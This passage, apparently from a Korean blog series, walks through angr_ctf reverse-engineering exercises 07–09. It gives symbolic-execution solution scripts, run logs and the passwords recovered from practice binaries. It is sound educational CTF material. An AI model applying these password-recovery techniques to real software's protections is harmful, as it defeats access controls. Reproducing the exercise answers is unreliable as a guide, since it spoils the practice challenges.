<code>SimFile</code>&#xC774; &#xC62E;&#xACA8;&#xC84C;&#xB2E4;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB798;&#xC11C; &#xC704;&#xC5D0;&#xC11C; &#xC124;&#xBA85;&#xD55C; &#xBD80;&#xBD84;&#xC744; &#xB0A0;&#xB824;&#xC8FC;&#xACE0; &#xAC04;&#xB2E8;&#xD558;&#xAC8C; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xC218;&#xC815;&#xD574;&#xC8FC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python">password_file = angr.SimFile(filename,          content = password,          size = symbolic_file_size_bytes)initial_state = project.factory.blank_state(          addr = start_address,          fs = {filename: password_file})</code></pre><p>&#xC774;&#xB807;&#xAC8C;&#xB9CC; &#xBD10;&#xB3C4; &#xD6E8;&#xC52C;&#xB354; &#xC4F0;&#xAE30; &#xD3B8;&#xD574;&#xC9C4;&#xAC70; &#xAC19;&#xB124;&#xC694;. &#xC77C;&#xB2E8; <code>SimFile</code>&#xC744; &#xD1B5;&#xD574; &#xBC14;&#xB85C; &#xD30C;&#xC77C;&#xC744; &#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xC158;&#xD574;&#xC904; &#xC218; &#xC788;&#xAC8C; &#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; <code>black_state</code>&#xC758; <code>fs</code> &#xC778;&#xC790;&#xC5D0; &#xD30C;&#xC77C; &#xC774;&#xB984;&#xACFC; &#xD30C;&#xC77C; &#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xD130;&#xB9CC; &#xB9E4;&#xD551;&#xD574;&#xC11C; &#xC804;&#xB2EC;&#xB9CC; &#xD574;&#xC8FC;&#xBA74; &#xB05D;!!!</p><h2 id="sol07-py"><a href="#sol07-py" class="headerlink" title="sol07.py"></a>sol07.py</h2><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<span class="hljs-keyword">import</span> claripy<span class="hljs-keyword">import</span> sys<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span>  project = angr.Project(<span class="hljs-string">&apos;07_angr_symbolic_file&apos;</span>)  start_address = <span class="hljs-number">0x080488D6</span>  filename = <span class="hljs-string">&apos;OJKSQYDP.txt&apos;</span>  symbolic_file_size_bytes = <span class="hljs-number">0x40</span>  password = claripy.BVS(<span class="hljs-string">&apos;password&apos;</span>, symbolic_file_size_bytes * <span class="hljs-number">8</span>)  password_file = angr.SimFile(filename,          content = password,          size = symbolic_file_size_bytes)  initial_state = project.factory.blank_state(          addr = start_address,          fs = {filename: password_file}  )  simulation = project.factory.simgr(initial_state)  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">is_successful</span>(<span class="hljs-params">state</span>):</span>    stdout_output = state.posix.dumps(sys.stdout.fileno())    <span class="hljs-keyword">return</span> <span class="hljs-string">b&apos;Good Job.&apos;</span> <span class="hljs-keyword">in</span> stdout_output  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">should_abort</span>(<span class="hljs-params">state</span>):</span>    stdout_output = state.posix.dumps(sys.stdout.fileno())    <span class="hljs-keyword">return</span> <span class="hljs-string">b&apos;Try again.&apos;</span> <span class="hljs-keyword">in</span> stdout_output  simulation.explore(find=is_successful, avoid=should_abort)  <span class="hljs-keyword">if</span> simulation.found:    solution_state = simulation.found[<span class="hljs-number">0</span>]    solution = solution_state.solver.eval(password,cast_to=bytes).decode()    print(solution)  <span class="hljs-keyword">else</span>:    <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&apos;Could not find the solution&apos;</span>)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&apos;__main__&apos;</span>:  main()</code></pre><pre><code class="hljs python">j0ker@angr:~/angr_ctf/dist$ python3 sol07.py <span class="hljs-number">07</span>_angr_symbolic_file WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-15</span> <span class="hljs-number">05</span>:<span class="hljs-number">56</span>:<span class="hljs-number">08</span>,<span class="hljs-number">302</span> | angr.storage.memory_mixins.default_filler_mixin | The program <span class="hljs-keyword">is</span> accessing memory <span class="hljs-keyword">or</span> registers <span class="hljs-keyword">with</span> an unspecified value. This could indicate unwanted behavior.WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-15</span> <span class="hljs-number">05</span>:<span class="hljs-number">56</span>:<span class="hljs-number">08</span>,<span class="hljs-number">302</span> | angr.storage.memory_mixins.default_filler_mixin | angr will cope <span class="hljs-keyword">with</span> this by generating an unconstrained symbolic variable <span class="hljs-keyword">and</span> continuing. You can resolve this by:WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-15</span> <span class="hljs-number">05</span>:<span class="hljs-number">56</span>:<span class="hljs-number">08</span>,<span class="hljs-number">302</span> | angr.storage.memory_mixins.default_filler_mixin | <span class="hljs-number">1</span>) setting a value to the initial stateWARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-15</span> <span class="hljs-number">05</span>:<span class="hljs-number">56</span>:<span class="hljs-number">08</span>,<span class="hljs-number">302</span> | angr.storage.memory_mixins.default_filler_mixin | <span class="hljs-number">2</span>) adding the state option ZERO_FILL_UNCONSTRAINED_{MEMORY,REGISTERS}, to make unknown regions hold nullWARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-15</span> <span class="hljs-number">05</span>:<span class="hljs-number">56</span>:<span class="hljs-number">08</span>,<span class="hljs-number">302</span> | angr.storage.memory_mixins.default_filler_mixin | <span class="hljs-number">3</span>) adding the state option SYMBOL_FILL_UNCONSTRAINED_{MEMORY,REGISTERS}, to suppress these messages.WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-15</span> <span class="hljs-number">05</span>:<span class="hljs-number">56</span>:<span class="hljs-number">08</span>,<span class="hljs-number">302</span> | angr.storage.memory_mixins.default_filler_mixin | Filling register ebp <span class="hljs-keyword">with</span> <span class="hljs-number">4</span> unconstrained bytes referenced <span class="hljs-keyword">from</span> <span class="hljs-number">0x804893c</span> (main+<span class="hljs-number">0xc2</span> <span class="hljs-keyword">in</span> <span class="hljs-number">07</span>_angr_symbolic_file (<span class="hljs-number">0x804893c</span>))AZOMMMZMj0ker@angr:~/angr_ctf/dist$ ./<span class="hljs-number">07</span>_angr_symbolic_file Enter the password: AZOMMMZMGood Job.</code></pre><h1 id="08-angr-constraints"><a href="#08-angr-constraints" class="headerlink" title="08_angr_constraints"></a>08_angr_constraints</h1><p>&#xC774;&#xBC88;&#xC5D0;&#xB294; &#xACBD;&#xB85C;&#xC81C;&#xC57D;&#xC870;&#xAC74;&#xC5D0; &#xB300;&#xD55C; &#xBB38;&#xC81C;&#xC77C;&#xB4EF; &#xC2F6;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC744; &#xAE4C;&#xBCF4;&#xBA74; &#xADF8;&#xB0E5; &#xC77C;&#xBC18;&#xC801;&#xC778; &#xBB38;&#xC81C;&#xC785;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/08/15/j0ker/angr_part4/Untitled 2.png" alt="angr_part4/Untitled 2.png"></p><p><code>password</code>&#xC5D0; &#xBB38;&#xC790;&#xC5F4;&#xC774; &#xC788;&#xACE0; 16&#xBC14;&#xC774;&#xD2B8; &#xC785;&#xB825;&#xAC12;&#xC744; &#xBC1B;&#xC740; &#xB4A4; &#xC785;&#xB825;&#xAC12;&#xACFC; <code>password</code>&#xB97C; &#xC9EC;&#xC9DC;&#xBBF8;&#xD558;&#xC5EC; &#xD2B9;&#xC815; &#xBB38;&#xC790;&#xC5F4;&#xACFC; &#xAC19;&#xC740;&#xC9C0; &#xBE44;&#xAD50;&#xD558;&#xB294; &#xAC70;&#xACA0;&#xC8E0;. &#xADFC;&#xB370; &#xC5F0;&#xC0B0; &#xACB0;&#xACFC;&#xAC12;&#xC744; &#xBE44;&#xAD50;&#xD558;&#xB294; &#xBD80;&#xBD84;&#xC774; &#xD568;&#xC218;&#xB85C; &#xB418;&#xC5B4; &#xC788;&#xB124;&#xC694;. &#xC774; &#xD568;&#xC218;&#xB3C4; &#xBD05;&#xC2DC;&#xB2E4;.</p><p><img src="/2021/08/15/j0ker/angr_part4/Untitled 3.png" alt="Untitled"></p><p>&#xD568;&#xC218;&#xB97C; &#xBCF4;&#xBA74; &#xB450; &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xBE44;&#xAD50;&#xD558;&#xB294; &#xAC74; &#xB9DE;&#xC9C0;&#xB9CC; &#xD2C0;&#xB9AC;&#xB294; &#xC989;&#xC2DC; &#xB9AC;&#xD134;&#xD558;&#xB294;&#xAC8C; &#xC544;&#xB2C8;&#xB77C; &#xBB38;&#xC790; &#xBA87;&#xAC1C;&#xAC00; &#xB9DE;&#xB294;&#xC9C0; &#xC13C;&#xB2E4;&#xC74C; &#xBA87;&#xAC1C;&#xAC00; &#xB9DE;&#xB294;&#xC9C0; 16&#xBC14;&#xC774;&#xD2B8;&#xAC00; &#xB9DE;&#xB294;&#xC9C0;&#xB97C; &#xBE44;&#xAD50;&#xD558;&#xACE0; &#xB9AC;&#xD134;&#xD558;&#xB124;&#xC694;. angr&#xC5D0;&#xC11C; &#xC774;&#xB7F0; &#xD568;&#xC218;&#xB97C; &#xBD84;&#xC11D;&#xD558;&#xAC8C; &#xB418;&#xBA74; &#xBB34;&#xC218;&#xD788; &#xB9CE;&#xC740; state&#xAC00; &#xC0DD;&#xC131;&#xB420;&#xAC8C; &#xBED4;&#xD569;&#xB2C8;&#xB2E4;. &#xC911;&#xAC04;&#xC5D0; &#xBA48;&#xCD9C;&#xC218;&#xAC00; &#xC5C6;&#xC73C;&#xB2C8; &#xB9D0;&#xC774;&#xC8E0;. &#xAC70;&#xAE30;&#xC5D0;&#xB2E4;&#xAC00; 16&#xBC14;&#xC774;&#xD2B8;&#xC9DC;&#xB9AC; &#xBB38;&#xC790;&#xC5F4;&#xC774;&#xBA74; &#xC5C4;&#xCCAD;&#xB09C; &#xACBD;&#xC6B0;&#xC758; &#xC218;(branch)&#xAC00; &#xC788;&#xC73C;&#xB2C8; &#xC774; &#xD568;&#xC218;&#xB294; &#xC560;&#xCD08;&#xC5D0; &#xBD84;&#xC11D;&#xD558;&#xBA74; &#xC548;&#xB420;&#xB4EF; &#xC2F6;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xC774; &#xD568;&#xC218;&#xC5D0; &#xB4E4;&#xC5B4;&#xAC00;&#xAE30; &#xC804;&#xC5D0; &#xC5F0;&#xC0B0; &#xACB0;&#xACFC;&#xAC12;&#xC744; &#xC6B0;&#xB9AC;&#xAC00; &#xC9C1;&#xC811; &#xBE44;&#xAD50;&#xD558;&#xB294;&#xAC8C; &#xC880; &#xB354; &#xD6A8;&#xC728;&#xC801;&#xC77C;&#xB4EF; &#xC2F6;&#xB124;&#xC694;.</p><p>&#xC77C;&#xB2E8; &#xBA3C;&#xC800; <code>scanf</code> &#xB4A4;&#xC5D0;&#xC11C; &#xC2DC;&#xC791;&#xD574;&#xC11C; <code>check_equals_</code> &#xD568;&#xC218;&#xAE4C;&#xC9C0; &#xBD84;&#xC11D;&#xD574; &#xB3C4;&#xB2EC;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xC791;&#xC131;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; <code>check_equals_</code>&#xD568;&#xC218;&#xC5D0; &#xB4E4;&#xC5B4;&#xAC00;&#xAE30; &#xC804;&#xC5D0; &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xCCB4;&#xD06C;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python">constrained_parameter_address = <span class="hljs-number">0x0804A050</span>constrained_parameter_size_bytes = <span class="hljs-number">16</span>constrained_parameter_bitvector = solution_state.memory.load(  constrained_parameter_address,  constrained_parameter_size_bytes)constrained_parameter_desired_value = <span class="hljs-string">&apos;AUPDNNPROEZRJWKB&apos;</span>solution_state.add_constraints(constrained_parameter_bitvector == constrained_parameter_desired_value)</code></pre><p>&#xC77C;&#xB2E8; &#xC785;&#xB825;&#xAC12;&#xC758; &#xC8FC;&#xC18C;&#xC640; &#xC0AC;&#xC774;&#xC988;&#xB97C; &#xC9C0;&#xC815;&#xD574;&#xC8FC;&#xACE0; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0;&#xC11C; &#xB85C;&#xB4DC;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; &#xD574;&#xB2F9; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xC788;&#xB294; &#xAC12;&#xACFC; &#xC6B0;&#xB9AC;&#xAC00; &#xACB0;&#xACFC;&#xC801;&#xC73C;&#xB85C; &#xB9DE;&#xC544;&#xC57C;&#xD560; &#xAC12;&#xC774; &#xAC19;&#xC544;&#xC57C;&#xD55C;&#xB2E4;&#xB294; &#xC81C;&#xC57D; &#xC870;&#xAC74;&#xC744; &#xCD94;&#xAC00;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;. &#xC774;&#xB807;&#xAC8C; &#xB418;&#xBA74; z3&#xC5D0;&#xC11C; &#xACB0;&#xACFC;&#xAC12;&#xC744; &#xB3C4;&#xCD9C;&#xD560; &#xB54C; &#xC6B0;&#xB9AC;&#xAC00; &#xC124;&#xC815;&#xD55C; &#xC81C;&#xC57D;&#xC870;&#xAC74;&#xC744; &#xCD94;&#xAC00;&#xD558;&#xC5EC; &#xACC4;&#xC0B0;&#xC744; &#xD574;&#xC90D;&#xB2C8;&#xB2E4;! &#xADF8;&#xB7EC;&#xBA74; &#xB05D;!</p><p>&#xC774; &#xBB38;&#xC81C;&#xC5D0;&#xC11C; &#xC870;&#xAE08; &#xC758;&#xBB38;&#xC774;&#xC5C8;&#xB358; &#xC810;&#xC740; &#xCC98;&#xC74C;&#xC5D0; &#xC785;&#xB825;&#xAC12;&#xC774; &#xD558;&#xB098;&#xC778; &#xAC83;&#xC744; &#xBCF4;&#xACE0; &#xADF8;&#xB0E5; <code>entry_state</code>&#xBD80;&#xD130; &#xBD84;&#xC11D;&#xD558;&#xB3C4;&#xB85D; &#xD504;&#xB85C;&#xC81D;&#xD2B8;&#xB97C; &#xC124;&#xC815;&#xD588;&#xB294;&#xB370; &#xC548;&#xB418;&#xB354;&#xB77C;&#xACE0;&#xC694;? &#xADF8;&#xB798;&#xC11C; &#xC800;&#xB294; &#xC81C;&#xAC00; &#xBB38;&#xC81C;&#xB97C; &#xC798;&#xBABB;&#xD47C; &#xC904; &#xC54C;&#xC558;&#xB294;&#xB370;, <code>scanf</code> &#xB4A4;&#xB85C; &#xC124;&#xC815;&#xD558;&#xB2C8;&#xAE4C; &#xBB38;&#xC81C;&#xAC00; &#xD480;&#xB838;&#xC2B5;&#xB2C8;&#xB2E4;&#x2026; &#xCC98;&#xC74C;&#xC5D0;&#xB294; angr&#xC5D0;&#xC11C; &#xD2B9;&#xC815; &#xD06C;&#xAE30; &#xC774;&#xC0C1;&#xC758; &#xC785;&#xB825;&#xAC12;&#xC744; &#xC778;&#xC2DD;&#xD558;&#xC9C0; &#xBABB;&#xD558;&#xB098;? &#xD588;&#xB294;&#xB370;, &#xB2E4;&#xC74C; &#xBB38;&#xC81C;&#xC5D0;&#xC11C;&#xB294; &#xB610; &#xC815;&#xC0C1;&#xC801;&#xC73C;&#xB85C; &#xB429;&#xB2C8;&#xB2E4; &#x314B;&#x314B;&#x314B; &#xC774;&#xAC8C; &#xBB54;&#xC9C0;&#x2026;</p><h2 id="sol08-py"><a href="#sol08-py" class="headerlink" title="sol08.py"></a>sol08.py</h2><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<span class="hljs-keyword">import</span> claripy<span class="hljs-keyword">import</span> sys<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>(<span class="hljs-params">argv</span>):</span>  path_to_binary = argv[<span class="hljs-number">1</span>]  project = angr.Project(path_to_binary)  start_address = <span class="hljs-number">0x08048625</span>  initial_state = project.factory.blank_state(addr=start_address)  <span class="hljs-comment"># initial_state = project.factory.entry_state()</span>  password = claripy.BVS(<span class="hljs-string">&apos;password&apos;</span>, <span class="hljs-number">8</span>*<span class="hljs-number">16</span>)  password_address =  <span class="hljs-number">0x0804A050</span>  initial_state.memory.store(password_address, password)  simulation = project.factory.simgr(initial_state)  address_to_check_constraint = <span class="hljs-number">0x08048673</span>  simulation.explore(find=address_to_check_constraint)  <span class="hljs-keyword">if</span> simulation.found:    solution_state = simulation.found[<span class="hljs-number">0</span>]    constrained_parameter_address = <span class="hljs-number">0x0804A050</span>    constrained_parameter_size_bytes = <span class="hljs-number">16</span>    constrained_parameter_bitvector = solution_state.memory.load(      constrained_parameter_address,      constrained_parameter_size_bytes    )    constrained_parameter_desired_value = <span class="hljs-string">&apos;AUPDNNPROEZRJWKB&apos;</span>    solution_state.add_constraints(constrained_parameter_bitvector == constrained_parameter_desired_value)    solution = solution_state.se.eval(password, cast_to=bytes)    print(solution)  <span class="hljs-keyword">else</span>:    <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&apos;Could not find the solution&apos;</span>)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&apos;__main__&apos;</span>:  main(sys.argv)</code></pre><pre><code class="hljs python">j0ker@angr:~/angr_ctf/dist$ python3 sol08.py <span class="hljs-number">08</span>_angr_constraints WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-15</span> <span class="hljs-number">06</span>:<span class="hljs-number">22</span>:<span class="hljs-number">55</span>,<span class="hljs-number">285</span> | angr.storage.memory_mixins.default_filler_mixin | The program <span class="hljs-keyword">is</span> accessing memory <span class="hljs-keyword">or</span> registers <span class="hljs-keyword">with</span> an unspecified value. This could indicate unwanted behavior.WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-15</span> <span class="hljs-number">06</span>:<span class="hljs-number">22</span>:<span class="hljs-number">55</span>,<span class="hljs-number">285</span> | angr.storage.memory_mixins.default_filler_mixin | angr will cope <span class="hljs-keyword">with</span> this by generating an unconstrained symbolic variable <span class="hljs-keyword">and</span> continuing. You can resolve this by:WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-15</span> <span class="hljs-number">06</span>:<span class="hljs-number">22</span>:<span class="hljs-number">55</span>,<span class="hljs-number">285</span> | angr.storage.memory_mixins.default_filler_mixin | <span class="hljs-number">1</span>) setting a value to the initial stateWARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-15</span> <span class="hljs-number">06</span>:<span class="hljs-number">22</span>:<span class="hljs-number">55</span>,<span class="hljs-number">285</span> | angr.storage.memory_mixins.default_filler_mixin | <span class="hljs-number">2</span>) adding the state option ZERO_FILL_UNCONSTRAINED_{MEMORY,REGISTERS}, to make unknown regions hold nullWARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-15</span> <span class="hljs-number">06</span>:<span class="hljs-number">22</span>:<span class="hljs-number">55</span>,<span class="hljs-number">285</span> | angr.storage.memory_mixins.default_filler_mixin | <span class="hljs-number">3</span>) adding the state option SYMBOL_FILL_UNCONSTRAINED_{MEMORY,REGISTERS}, to suppress these messages.WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-15</span> <span class="hljs-number">06</span>:<span class="hljs-number">22</span>:<span class="hljs-number">55</span>,<span class="hljs-number">285</span> | angr.storage.memory_mixins.default_filler_mixin | Filling register ebp <span class="hljs-keyword">with</span> <span class="hljs-number">4</span> unconstrained bytes referenced <span class="hljs-keyword">from</span> <span class="hljs-number">0x8048625</span> (main+<span class="hljs-number">0x72</span> <span class="hljs-keyword">in</span> <span class="hljs-number">08</span>_angr_constraints (<span class="hljs-number">0x8048625</span>))WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-15</span> <span class="hljs-number">06</span>:<span class="hljs-number">22</span>:<span class="hljs-number">57</span>,<span class="hljs-number">291</span> | claripy.ast.bv | BVV value <span class="hljs-keyword">is</span> being coerced <span class="hljs-keyword">from</span> a unicode string, encoding <span class="hljs-keyword">as</span> utf<span class="hljs-number">-8</span>WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-15</span> <span class="hljs-number">06</span>:<span class="hljs-number">22</span>:<span class="hljs-number">57</span>,<span class="hljs-number">292</span> | claripy.ast.bv | BVV value <span class="hljs-keyword">is</span> being coerced <span class="hljs-keyword">from</span> a unicode string, encoding <span class="hljs-keyword">as</span> utf<span class="hljs-number">-8</span>CRITICAL | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-15</span> <span class="hljs-number">06</span>:<span class="hljs-number">22</span>:<span class="hljs-number">57</span>,<span class="hljs-number">310</span> | angr.sim_state | The name state.se <span class="hljs-keyword">is</span> deprecated; please use state.solver.<span class="hljs-string">b&apos;LGCRCDGJHYUNGUJB&apos;</span>j0ker@angr:~/angr_ctf/dist$ ./<span class="hljs-number">08</span>_angr_constraints Enter the password: LGCRCDGJHYUNGUJBGood Job.</code></pre><h1 id="09-angr-hooks"><a href="#09-angr-hooks" class="headerlink" title="09_angr_hooks"></a>09_angr_hooks</h1><p>&#xC81C;&#xBAA9;&#xB9CC; &#xBCF4;&#xBA74; &#xBB54;&#xAC08; &#xD6C4;&#xD0B9;&#xD574;&#xC57C;&#xD558;&#xB294;&#xAC70; &#xAC19;&#xB124;&#xC694;. &#xBB58; &#xD6C4;&#xD0B9;&#xD574;&#xC57C;&#xD560; &#xC9C0; &#xBD05;&#xC2DC;&#xB2E4;.</p><p><img src="/2021/08/15/j0ker/angr_part4/Untitled 4.png" alt="Untitled"></p><p>&#xBCF4;&#xBA74; &#xC785;&#xB825;&#xC744; &#xB450;&#xBC88; &#xBC1B;&#xB294;&#xB370;, &#xC77C;&#xB2E8; &#xCCAB;&#xBC88;&#xC9F8; &#xBC1B;&#xB294;&#xAC78; &#xC544;&#xAE4C;&#xC640; &#xAC19;&#xC740; &#xD568;&#xC218;&#xB85C; &#xCCB4;&#xD06C;&#xB97C; &#xD558;&#xB124;&#xC694;. &#xC774; &#xBD80;&#xBD84;&#xC744; &#xD6C4;&#xD0B9;&#xD574;&#xC11C; &#xB6F0;&#xC5B4;&#xB118;&#xC5B4;&#xC57C;&#xD560;&#xB4EF; &#xBCF4;&#xC785;&#xB2C8;&#xB2E4;. &#xB4A4;&#xC5D0;&#xB294; &#xBB50; &#xADF8;&#xB0E5; &#xBE44;&#xAD50;&#xD558;&#xB294;&#xAC70;&#xB2C8; &#xBCC4;&#xAC70; &#xC5C6;&#xAD6C;&#xC694;. &#xD6C4;&#xD0B9;&#xC740; &#xD574;&#xBCF8;&#xC801;&#xC774; &#xC5C6;&#xC73C;&#xB2C8; &#xBB38;&#xC81C; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xBCF4;&#xBA74;&#xC11C; &#xD480;&#xC5B4;&#xBCF4;&#xC8E0;!</p><pre><code class="hljs python">check_equals_called_address = <span class="hljs-number">0x080486B3</span>instruction_to_skip_length = <span class="hljs-number">5</span></code></pre><p>&#xC77C;&#xB2E8; &#xC5B4;&#xB514;&#xC11C;&#xBD80;&#xD130; &#xD6C4;&#xD0AC;&#xD560; &#xAC83;&#xC778;&#xC9C0; &#xC9C0;&#xC815;&#xC744; &#xD574;&#xC90D;&#xB2C8;&#xB2E4;. &#xC800; &#xAC19;&#xC740; &#xACBD;&#xC6B0;&#xC5D0;&#xB294; &#xB531; check<em>equals</em> &#xD568;&#xC218;&#xAC00; &#xD638;&#xCD9C;&#xB418;&#xB294; &#xBD80;&#xBD84;&#xBD80;&#xD130; &#xD6C4;&#xD0B9;&#xD558;&#xB3C4;&#xB85D; &#xC8FC;&#xC18C;&#xB97C; &#xC9C0;&#xC815;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xC778;&#xC2A4;&#xD2B8;&#xB7ED;&#xC158;&#xC758; &#xAE38;&#xC774;&#xAC00; 5&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC0AC;&#xC774;&#xC988;&#xB294; 5&#xB85C; &#xC9C0;&#xC815;&#xC744; &#xD574;&#xC8FC;&#xC5C8;&#xAD6C;&#xC694;. &#xADF8;&#xB9AC;&#xACE0; &#xC774;&#xC81C; &#xD6C4;&#xD0B9; &#xD568;&#xC218;&#xB97C; &#xC9C0;&#xC815;&#xD574; &#xC90D;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python"><span class="hljs-meta">@project.hook(check_equals_called_address, length=instruction_to_skip_length)</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">skip_check_equals_</span>(<span class="hljs-params">state</span>):</span>  user_input_buffer_address = <span class="hljs-number">0x0804A054</span>  user_input_buffer_length = <span class="hljs-number">16</span>  user_input_string = state.memory.load(    user_input_buffer_address,     user_input_buffer_length  )    check_against_string = <span class="hljs-string">&apos;XYMKBKUHNIQYNQXE&apos;</span> <span class="hljs-comment"># :string</span>  state.regs.eax = claripy.If(    user_input_string == check_against_string,     claripy.BVV(<span class="hljs-number">1</span>, <span class="hljs-number">32</span>),     claripy.BVV(<span class="hljs-number">0</span>, <span class="hljs-number">32</span>)  )simulation = project.factory.simgr(initial_state)</code></pre><p>hook &#xD568;&#xC218;&#xC5D0; &#xC704;&#xC5D0;&#xC11C; &#xC124;&#xC815;&#xD55C; &#xB0B4;&#xC6A9;&#xB4E4;&#xC744; &#xC778;&#xC790;&#xB85C; &#xB118;&#xACA8;&#xC8FC;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xC774; &#xB54C;&#xBD80;&#xD130; &#xD6C4;&#xD0B9;&#xD558;&#xB3C4;&#xB85D; &#xC9C0;&#xC2DC;&#xB97C; &#xD558;&#xB294;&#xAC70;&#xACA0;&#xC8E0;. &#xADF8;&#xB7F0; &#xB2E4;&#xC74C; &#xD568;&#xC218;&#xB97C; &#xD558;&#xB098; &#xC120;&#xC5B8;&#xD574;&#xC8FC;&#xB294;&#xB370; &#xC774;&#xAC8C; &#xC774;&#xC81C; &#xD6C4;&#xD0B9;&#xD560; &#xB300;&#xC0C1;&#xC744; &#xAC74;&#xB108;&#xB6F0;&#xB294; &#xB300;&#xC2E0; &#xC2E4;&#xD589;&#xD560; &#xB0B4;&#xC6A9;&#xC778;&#xB4EF; &#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC5EC;&#xAE30;&#xC5D0;&#xC11C;&#xB294; &#xC5F0;&#xC0B0;&#xB41C; &#xACB0;&#xACFC;&#xAC12;&#xC774; &#xD2B9;&#xC815; &#xBB38;&#xC790;&#xC5F4;&#xC778;&#xC9C0; &#xBE44;&#xAD50;&#xD574;&#xC8FC;&#xACE0; &#xACB0;&#xACFC; &#xAC12;&#xC774; 1&#xC774; &#xB418;&#xB294;&#xB3C4;&#xB85D; &#xD574;&#xC57C;&#xACA0;&#xC8E0;? &#xBA3C;&#xC800; &#xBE44;&#xAD50;&#xD574;&#xC57C;&#xD560; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0;&#xC11C; &#xAC12;&#xC744; &#xB85C;&#xD2B8;&#xD558;&#xACE0; &#xCD5C;&#xC885;&#xC801;&#xC73C;&#xB85C; &#xBE44;&#xAD50;&#xD574;&#xC57C;&#xD560; &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xC9C0;&#xC815;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;. &#xC544;&#xC2DC;&#xB2E4;&#xC2DC;&#xD53C; &#xD568;&#xC218;&#xC758; &#xB9AC;&#xD134;&#xAC12;&#xC740; &#xBCF4;&#xD1B5; eax&#xC5D0; &#xC800;&#xC7A5;&#xB429;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xB9C8;&#xC9C0;&#xB9C9;&#xC5D0; claripy&#xB97C; &#xC0AC;&#xC6A9;&#xD574;&#xC11C; &#xC778;&#xC790;&#xB85C; &#xB123;&#xC740; &#xC870;&#xAC74;, &#xC989; &#xC5F0;&#xC0B0;&#xAC12;&#xC774; &#xC6B0;&#xB9AC;&#xAC00; &#xBE44;&#xAD50;&#xD574;&#xC57C;&#xD560; &#xBB38;&#xC790;&#xC5F4;&#xACFC; &#xAC19;&#xC740;&#xC9C0; &#xC5EC;&#xBD80;&#xC5D0; &#xB530;&#xB77C; eax&#xB97C; 1&#xB85C; &#xC124;&#xC815;&#xD560; &#xAC83;&#xC774;&#xB0D0; 0&#xC73C;&#xB85C; &#xC124;&#xC815;&#xD560; &#xAC83;&#xC774;&#xB0D0;&#xB97C; &#xC9C0;&#xC815;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xBA74; &#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xD130;&#xAC00; &#xC54C;&#xC544;&#xC11C; &#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xC158;&#xC744; &#xD574;&#xC8FC;&#xACA0;&#xC8E0;. &#xB098;&#xBA38;&#xC9C0; &#xB4A4;&#xC5D0; &#xBD80;&#xBD84;&#xC740; &#xC55E; &#xBB38;&#xC81C;&#xB4E4;&#xACE0; 